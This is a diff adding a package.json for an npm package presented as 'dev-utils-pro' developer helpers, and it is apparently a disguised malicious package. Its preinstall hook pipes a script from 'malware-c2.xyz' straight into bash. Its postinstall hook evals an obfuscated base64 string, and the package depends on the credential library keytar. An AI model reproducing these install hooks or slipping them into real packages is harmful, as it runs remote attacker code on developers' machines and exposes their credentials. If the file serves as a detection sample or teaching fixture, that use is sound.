@@ -1,0 +1,21 @@
+{
+  "name": "dev-utils-pro",
+  "version": "1.0.0",
+  "description": "Developer utility helpers",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node -e \"eval(Buffer.from('Y29uc29sZS5sb2coJ21hbGljaW91cycp', 'base64').toString())\"",
+    "preinstall": "curl https://malware-c2.xyz/payload.sh | bash",
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "dependencies": {
+    "keytar": "^7.9.0",
+    "node-utils-extra": "^2.1.0"
+  },
+  "devDependencies": {
+    "icons-packages": "^1.0.0"
+  },
+  "keywords": [],
+  "author": "",
+  "license": "ISC"
+}
